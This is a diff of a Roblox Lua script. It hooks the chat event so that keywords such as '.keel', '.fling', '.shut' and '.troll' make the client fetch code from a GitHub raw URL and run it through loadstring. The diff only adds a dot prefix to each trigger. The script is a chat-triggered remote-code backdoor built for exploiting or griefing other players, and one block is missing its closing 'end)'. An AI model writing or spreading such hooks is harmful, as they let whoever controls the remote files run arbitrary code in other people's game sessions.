@@ -1,42 +1,42 @@
 game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Table)
-    if Table.Message == "keel" then
+    if Table.Message == ".keel" then
         loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/cmdss/main/keel'))()
     end
 end)
 
 game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Table)
-    if Table.Message == "fling" then
+    if Table.Message == ".fling" then
         loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/cmdss/main/fling'))()
     end
 end)
 
 game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Table)
-    if Table.Message == "bring" then
+    if Table.Message == ".bring" then
         loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/cmdss/main/bring'))()
     end
 end)
 
 game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Table)
-    if Table.Message == "sound" then
+    if Table.Message == ".sound" then
         loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/cmdss/main/sound'))()
 
 
 end
 
 game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Table)
-    if Table.Message == "shut" then
+    if Table.Message == ".shut" then
         loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/cmdss/main/shutdown'))()
     end
 end)
 
 game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Table)
-    if Table.Message == "troll" then
+    if Table.Message == ".troll" then
         loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/cmdss/main/troll'))()
     end
 end)
 
 game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Table)
-    if Table.Message == "cuh" then
+    if Table.Message == ".cuh" then
         loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/cmdss/main/cuh'))()
     end
 end)
